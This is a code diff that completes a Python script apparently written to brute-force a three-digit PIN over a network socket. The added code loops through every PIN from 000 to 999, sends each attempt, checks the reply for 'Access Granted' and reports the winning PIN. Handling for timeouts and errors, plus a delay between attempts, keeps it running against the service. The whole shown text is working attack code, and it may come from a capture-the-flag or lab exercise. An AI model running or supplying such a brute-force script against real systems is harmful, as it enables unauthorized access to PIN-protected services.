@@ -40,5 +40,32 @@ def try_pin(pin):
                 except socket.timeout:
                     print(f"Socket timed out while receiving data for PIN {pin_str}")
                     break
+        
         # Decode response
         decoded = response.decode(errors="ignore")
+        
+        # Check for success
+        if "Access Granted" in decoded:
+            print(f"SUCCESS! PIN: {pin_str}")
+            return True
+        
+        print(f"Trying PIN {pin_str}")
+        return False
+    
+    except socket.error as e:
+        print(f"Socket error with PIN {pin_str}: {e}")
+        time.sleep(DELAY * 2)  # Wait longer on error
+        return False
+
+def main():
+    # Try PINs sequentially from 000 to 999
+    for pin in range(1000):
+        if try_pin(pin):
+            print(f"Found correct PIN: {pin:03d}")
+            break
+        
+        # Simple fixed delay between requests
+        time.sleep(DELAY)
+
+if __name__ == "__main__":
+    main()
